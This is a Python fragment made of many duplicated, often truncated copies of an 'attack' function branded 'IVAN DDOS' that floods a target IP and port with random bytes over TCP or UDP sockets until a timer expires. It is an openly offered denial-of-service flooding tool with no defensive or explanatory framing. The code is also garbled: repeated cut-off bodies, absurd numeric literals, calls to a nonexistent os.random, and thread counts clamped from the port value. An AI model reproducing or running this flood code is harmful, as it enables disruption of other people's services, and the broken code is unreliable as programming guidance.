    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
